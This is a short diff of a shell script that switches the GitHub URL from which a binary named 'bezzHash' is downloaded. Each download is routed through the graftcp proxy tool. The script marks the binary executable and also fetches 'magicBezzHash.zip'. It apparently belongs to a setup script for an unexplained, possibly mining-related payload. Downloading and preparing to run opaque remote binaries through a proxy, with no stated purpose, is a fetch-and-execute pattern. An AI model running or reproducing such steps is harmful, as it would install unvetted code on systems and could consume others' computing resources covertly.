@@ -35,7 +35,7 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
